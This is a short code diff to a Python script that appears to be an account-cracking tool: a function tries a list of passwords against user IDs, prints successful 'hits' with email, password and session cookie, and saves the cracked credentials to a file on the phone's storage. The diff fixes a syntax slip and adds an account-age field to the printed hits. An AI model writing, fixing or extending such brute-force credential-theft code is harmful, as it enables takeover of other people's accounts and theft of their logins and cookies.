@@ -538,7 +538,7 @@ def result(oks):
 def gxds_files(uid, pxss):
     global oks, loop, cps, ugen
     session = requests.Session()
-    sys.stdout.write(f"\r{dg}  [CHECKED: %s] \r"%(loop),
+    sys.stdout.write(f"\r{dg}  [CHECKED: %s] \r"%(loop)),
     sys.stdout.flush()
     try:
         for ps in pxss:
@@ -597,6 +597,7 @@ def gxds_files(uid, pxss):
                 print(f"""{lgr} [GXDS HITS] --
 EMAIL  : {uid} 
 PASS   : {ps} 
+JOINED : {yrs}
 COOKIE : {coki}
 """)
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
